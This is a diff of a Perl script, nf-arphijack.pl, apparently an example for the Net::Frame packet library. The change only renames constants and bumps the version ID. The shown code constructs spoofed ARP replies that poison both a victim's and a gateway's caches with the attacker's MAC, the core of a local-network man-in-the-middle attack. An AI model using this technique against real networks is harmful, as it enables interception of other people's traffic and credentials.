@@ -1,6 +1,6 @@
 #!/usr/bin/perl
 #
-# $Id: nf-arphijack.pl,v 1.3 2006/12/05 20:47:32 gomor Exp $
+# $Id: nf-arphijack.pl,v 1.4 2006/12/14 17:45:41 gomor Exp $
 #
 use strict;
 use warnings;
@@ -43,12 +43,12 @@ print "Victim : IP=$ipVictim - MAC=$macVictim\n";
 
 # Gateway tells victim
 my $eth1 = Net::Frame::ETH->new(
-   type => NP_ETH_TYPE_ARP,
+   type => NF_ETH_TYPE_ARP,
    src  => $macMy,
    dst  => $macVictim,
 );
 my $arp1 = Net::Frame::ARP->new(
-   opCode => NP_ARP_OPCODE_REPLY,
+   opCode => NF_ARP_OPCODE_REPLY,
    srcIp => $ipGateway,
    dstIp => $ipVictim,
    src   => $macMy,
@@ -61,12 +61,12 @@ print $replyToVictim->print."\n";
 
 # Victim tells gateway
 my $eth2 = Net::Frame::ETH->new(
-   type => NP_ETH_TYPE_ARP,
+   type => NF_ETH_TYPE_ARP,
    src  => $macMy,
    dst  => $macGateway,
 );
 my $arp2 = Net::Frame::ARP->new(
-   opCode => NP_ARP_OPCODE_REPLY,
+   opCode => NF_ARP_OPCODE_REPLY,
    srcIp => $ipVictim,
    dstIp => $ipGateway,
    src   => $macMy,
